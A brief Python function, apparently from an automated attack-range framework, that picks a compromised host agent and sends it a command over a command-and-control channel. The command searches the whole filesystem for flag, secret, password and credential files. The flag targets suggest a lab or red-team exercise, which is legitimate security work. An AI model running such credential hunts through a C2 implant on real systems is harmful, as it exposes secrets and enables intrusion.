async def query(
    environment_state_service,
    attack_graph_service,
):
    from incalmo.core.actions.LowLevel.run_bash_command import RunBashCommand
    
    agents = environment_state_service.get_agents()
    employee_agent = None
    for agent in agents:
        if agent.username == 'ubuntu' and '192.168.201.50' in agent.host_ip_addrs:
            employee_agent = agent
            break
    
    # Look for critical data files
    low_level_action = RunBashCommand(employee_agent, "find / -name '*.flag' -o -name 'flag*' -o -name '*secret*' -o -name '*critical*' -o -name '*password*' -o -name '*credential*' 2>/dev/null | grep -v proc | grep -v sys | head -30")
    result = environment_state_service.c2api_client.send_command(low_level_action)
    
    return (result.output, result.status if hasattr(result, 'status') else 'no status')
</query>
